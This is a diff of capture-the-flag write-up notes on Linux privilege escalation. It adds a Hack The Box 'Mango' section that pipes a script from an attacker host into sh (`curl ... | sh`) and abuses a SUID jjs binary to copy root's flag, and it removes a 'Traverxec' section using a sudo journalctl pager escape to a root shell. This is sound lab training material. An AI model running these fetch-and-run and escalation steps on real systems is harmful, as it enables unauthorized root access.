@@ -8,7 +8,7 @@ math: true
 ---
 
 
-# SUID binaries found with `sudo -l` for privilege escalation:
+# SUID binaries for privilege escalation:
 
 
 ## tryhackme linux priv esc arena:
@@ -178,7 +178,42 @@ root.txt: not found
 # cat root.txt
 2f907ed450b361b2c2bf4e8795d5b561
 ```
+## using jjs to priv esc - hack the box mango
 
+When we get a shell on the box we run `linenum.sh` to check for anything interesting.
+
+We run it and grep for sh to see if we have any SUID binaries that we can exploit and indeed we get one.
+
+```bash
+admin@mango:/home/admin$ curl 10.10.14.11/LinEnum.sh | sh
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 46108  100 46108    0     0   229k      0 --:--:-- --:--:-- --:--:--  228k
+-e
+#########################################################
+-e # Local Linux Enumeration & Privilege Escalation Script #
+-e #########################################################
+-e # www.rebootuser.com
+-e # version 0.98
+[...]
+-e [+] Possibly interesting SUID files:
+-rwsr-sr-- 1 root admin 10352 Jul 18 18:21 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+```
+After a few simple searches we find that we can execute commands with jjs and treat like a shell.
+
+We exploit it lie so below:
+```bash
+admin@mango:/home/admin$ /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+Warning: The jjs tool is planned to be removed from a future JDK release
+jjs> Java.type('java.lang.Runtime').getRuntime().exec('cp /root/root.txt /tmp/fieldraccoon.txt').waitFor()
+0
+jjs> Java.type('java.lang.Runtime').getRuntime().exec('chmod 777 /tmp/fieldraccoon.txt').waitFor()
+0
+
+jjs> admin@mango:/home/admin$ wc -c /tmp/fieldraccoon.txt
+33 /tmp/fieldraccoon.txt
+```
+From this we can see that we succesfully copy the root flag into our tmp directory and are able to read it.
 
 ## tryhackme lazy-admin box - sudo -l - perl priv-esc
 
@@ -224,74 +259,6 @@ uid=0(root) gid=0(root) groups=0(root)
 THM{6637f41d0177b6f37cb20d775124699f}
 ```
 ## tryhackme linux privlege escalation arena(80 different SUID binaries)(80 different priv esc methods):
-
-## priv esc with journalctl -  hack the box traverxec root:
-
-We find an interesting file in `bin` called `server-stats.sh` so we run it to see what its doing.
-
-```bash
-david@traverxec:~/bin$ bash server-stats.sh
-                                                                          .----.
-                                                              .---------. | == |
-   Webserver Statistics and Data                              |.-"""""-.| |----|
-         Collection Script                                    ||       || | == |
-          (c) David, 2019                                     ||       || |----|
-                                                              |'-.....-'| |::::|
-                                                              '"")---(""' |___.|
-                                                             /:::::::::::\"    "
-                                                            /:::=======:::\
-                                                        jgs '"""""""""""""'
-
-Load:  00:38:38 up 1 day,  5:31,  2 users,  load average: 0.00, 0.00, 0.00
-
-Open nhttpd sockets: 3
-Files in the docroot: 117
-
-Last 5 journal log lines:
--- Logs begin at Thu 2020-04-09 19:07:20 EDT, end at Sat 2020-04-11 00:38:38 EDT. --
-Apr 10 23:47:54 traverxec sudo[4133]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/7 ruser=www-data rhost=  user=www-data
-Apr 10 23:47:56 traverxec sudo[4133]: pam_unix(sudo:auth): conversation failed
-Apr 10 23:47:56 traverxec sudo[4133]: pam_unix(sudo:auth): auth could not identify password for [www-data]
-Apr 10 23:47:56 traverxec sudo[4133]: www-data : command not allowed ; TTY=pts/7 ; PWD=/tmp ; USER=root ; COMMAND=list
-Apr 10 23:47:56 traverxec crontab[4194]: (www-data) LIST (www-data)
-```
-we can see that it is outputting some kind of logs so we take a look at the file to see exactly what its doing.
-
-```bash
-#!/bin/bash
-
-cat /home/david/bin/server-stats.head
-echo "Load: `/usr/bin/uptime`"
-echo " "
-echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
-echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
-echo " "
-echo "Last 5 journal log lines:"
-/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
-```
-We can see on the top line that it is reading the head for `server-stats` which is the ascii art and the copyright.
-
-But at the bottom is the part that is running as root(sudo)
-```bash
-/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
-```
-This tells us that we can run `journalctl` as root.
-
-We can do a quick search on gtfobins which tells us that we can use it to execute a shell if our window is minimal.
-```bash
-avid@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
--- Logs begin at Thu 2020-04-09 19:07:20 EDT, end at Sat 2020-04-11 01:14:31 EDT. --
-Apr 10 23:47:54 traverxec sudo[4133]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/7 ruser=www-data rhost=  user=w
-Apr 10 23:47:56 traverxec sudo[4133]: pam_unix(sudo:auth): conversation failed
-Apr 10 23:47:56 traverxec sudo[4133]: pam_unix(sudo:auth): auth could not identify password for [www-data]
-Apr 10 23:47:56 traverxec sudo[4133]: www-data : command not allowed ; TTY=pts/7 ; PWD=/tmp ; USER=root ; COMMAND=list
-Apr 10 23:47:56 traverxec crontab[4194]: (www-data) LIST (www-data)
-!/bin/bash
-root@traverxec:/home/david#
-```
-After the script has executed we type `!/bin/bash` which will give us a shell.
-
-Overall this wasnt the greatest way to do this as without gtfobins it required pure guesswork as the shell wouldnt work if the window wasnt minmised.
 
 
 # Other
